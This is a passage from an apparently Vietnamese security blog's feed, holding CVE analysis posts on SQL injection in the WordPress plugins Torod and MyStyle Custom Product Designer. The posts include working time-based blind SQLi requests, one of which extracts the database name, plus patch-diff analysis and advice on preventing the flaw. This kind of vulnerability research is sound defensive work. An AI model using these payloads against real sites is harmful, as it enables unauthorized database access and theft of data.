1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i &lt;strong&gt;POST request&lt;/strong&gt; ch·ª©a payload SQLi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=get_regions_and_cities&amp;amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/time_resp.png&#34;&#xA;    alt=&#34;Responsed time&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ ph·∫£n h·ªìi th·ªùi gian&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =&amp;gt; payload ho·∫°t ƒë·ªông.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;UNION&lt;/strong&gt;: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong m·ªánh ƒë·ªÅ WHERE&lt;/strong&gt;: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi &lt;code&gt;SLEEP()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong m·ªánh ƒë·ªÅ FROM&lt;/strong&gt;: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#34;&#xA;    alt=&#34;SQL Excution Order&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Th·ª© t·ª± th·ª±c thi truy v·∫•n SQL&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ &lt;strong&gt;dump ƒë∆∞·ª£c h·∫øt data&lt;/strong&gt; l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request v·ªõi &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=get_regions_and_cities=1&amp;amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;S·ª≠ d·ª•ng &lt;code&gt;SUBSTRING()&lt;/code&gt; ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;SLEEP(5)&lt;/code&gt; n·∫øu k√Ω t·ª± ƒë√≥ l√† &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng hex encoding &lt;code&gt;w&lt;/code&gt; th√†nh &lt;code&gt;0x77&lt;/code&gt; v√¨ &lt;code&gt;country_id&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ &lt;strong&gt;POST&lt;/strong&gt; request trong n√™n b·ªã escape b·ªüi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; trong WordPress v√† b·ªüi &lt;code&gt;sanitize_text_field&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =&amp;gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-30936&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Torod&lt;/strong&gt; t·ª´ phi√™n b·∫£n &lt;strong&gt;1.9&lt;/strong&gt; tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Ch∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/torod/vulnerability/wordpress-torod-1-9-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Torod Plugin &amp;lt;= 1.9 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48281 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-27-cve-2025-48281/</link>
      <pubDate>Sat, 27 Sep 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-27-cve-2025-48281/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng t·ªìn t·∫°i trong plugin &lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.21.2&lt;/strong&gt;. L·ªó h·ªïng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh·∫£ nƒÉng tr√≠ch xu·∫•t ho·∫∑c thao t√∫ng d·ªØ li·ªáu.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;S·∫£n ph·∫©m&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mystyle-custom-product-designer&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MyStyle Custom Product Designer Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lo·∫°i l·ªó h·ªïng&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng&lt;/strong&gt;: &amp;lt;= 3.21.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;M·ª©c ƒë·ªô nghi√™m tr·ªçng (CVSS)&lt;/strong&gt;: Cao (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Y√™u c·∫ßu ƒë·∫∑c quy·ªÅn&lt;/strong&gt;: Kh√¥ng c·∫ßn x√°c th·ª±c&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt;: v3.21.1 (c√≥ l·ªó h·ªïng) v√† v3.21.2 (ƒë√£ v√°)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;C√¥ng c·ª• diff&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh phi√™n b·∫£n n√†o&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce plugin&lt;/strong&gt;: ph·∫£i ƒë∆∞·ª£c k√≠ch ho·∫°t tr∆∞·ªõc khi c√†i ƒë·∫∑t MyStyle v√¨ plugin n√†y s·ª≠ d·ª•ng m·ªôt s·ªë h√†m t·ª´ WooCommerce&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguy√™n nh√¢n ch√≠nh l√† vi·ªác ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ tham s·ªë &lt;strong&gt;GET&lt;/strong&gt; v√†o c√¢u truy v·∫•n SQL m√† kh√¥ng c√≥ bi·ªán ph√°p x√°c th·ª±c h·ª£p l·ªá.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D∆∞·ªõi ƒë√¢y l√† s·ª± kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n (3.21.1 v√† 3.21.2) trong file &lt;strong&gt;includes/entities/class-mystyle-designmanager.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/patch_diff.png&#34;&#xA;    alt=&#34;B·∫£n v√° kh√°c bi·ªát&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So s√°nh b·∫£n v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;B·∫£n v√° m·ªõi ƒë√£ th√™m danh s√°ch &lt;strong&gt;whitelist&lt;/strong&gt; &lt;code&gt;$allowed_orderby&lt;/code&gt; ƒë·ªÉ ch·ªâ cho ph√©p s·∫Øp x·∫øp theo c√°c c·ªôt h·ª£p l·ªá. N·∫øu gi√° tr·ªã &lt;code&gt;orderby&lt;/code&gt; kh√¥ng n·∫±m trong danh s√°ch, n√≥ s·∫Ω t·ª± ƒë·ªông b·ªã thay th·∫ø b·∫±ng &lt;code&gt;&#39;ms_design_id&#39;&lt;/code&gt;, ngƒÉn ch·∫∑n ch√®n m√£ ƒë·ªôc SQL.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng n·∫±m trong h√†m &lt;code&gt;get_designs&lt;/code&gt; thu·ªôc class &lt;code&gt;MyStyle_DesignManager&lt;/code&gt; (file &lt;strong&gt;includes/entities/class-mystyle-designmanager.php&lt;/strong&gt;).&#xA;H√†m n√†y ƒë∆∞·ª£c g·ªçi b·ªüi c√°c h√†m nh∆∞ &lt;code&gt;get_items&lt;/code&gt;, &lt;code&gt;init_index_request&lt;/code&gt;, v√† m·ªôt s·ªë h√†m ki·ªÉm th·ª≠.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_1.png&#34;&#xA;    alt=&#34;T√¨m ki·∫øm h√†m get_designs&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ t√¨m ki·∫øm get_designs&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;V√¨ ƒë√¢y l√† l·ªó h·ªïng &lt;strong&gt;unauthenticated&lt;/strong&gt;, c·∫ßn x√°c ƒë·ªãnh h√†m n√†o c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi m√† kh√¥ng y√™u c·∫ßu ƒëƒÉng nh·∫≠p.&#xA;K·∫øt qu·∫£ cho th·∫•y ch·ªâ c√≥ &lt;code&gt;init_index_request&lt;/code&gt; c√≥ th·ªÉ b·ªã khai th√°c tr·ª±c ti·∫øp qua URL &lt;code&gt;/designs/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/chart.png&#34;&#xA;    alt=&#34;Lu·ªìng x·ª≠ l√Ω&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Lu·ªìng t·∫•n c√¥ng logic&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;ki·ªÉm-tra-sqli&#34;&gt;&lt;span&gt;Ki·ªÉm tra SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#ki%e1%bb%83m-tra-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i request ch·ª©a payload SQLi ƒë·ªÉ ki·ªÉm tra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /designs/?orderby=(SELECT&amp;#43;SLEEP(5)) HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√¢u truy v·∫•n k·∫øt qu·∫£:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu ph·∫£n h·ªìi ch·∫≠m 5 gi√¢y ‚Üí payload ho·∫°t 